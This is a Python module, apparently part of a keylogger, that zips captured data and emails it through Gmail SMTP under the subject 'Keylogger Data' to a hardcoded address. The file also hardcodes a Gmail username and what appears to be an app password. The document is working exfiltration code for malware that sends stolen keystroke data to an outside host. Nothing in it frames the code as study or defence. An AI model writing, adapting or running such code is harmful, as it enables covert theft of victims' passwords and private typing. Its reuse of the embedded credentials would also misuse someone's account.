import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import logging

# These should be set in a secure place or environment file
EMAIL_USER = "programmingcaleb@gmail.com"
EMAIL_PASS = "xdoe ehde ckbo dbuj"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587  

def send_email(zip_filename, recipient_email="programmingcaleb@gmail.com"):
    """
    Sends an email with the zipped file as an attachment.
    """
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_USER
        msg['To'] = recipient_email
        msg['Subject'] = "Keylogger Data"

        # Attach the zipped file
        with open(zip_filename, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename="{os.path.basename(zip_filename)}"'
            )
            msg.attach(part)

        # Send the email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_USER, EMAIL_PASS)
        server.sendmail(EMAIL_USER, recipient_email, msg.as_string())
        server.quit()

        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Error sending email: {e}")
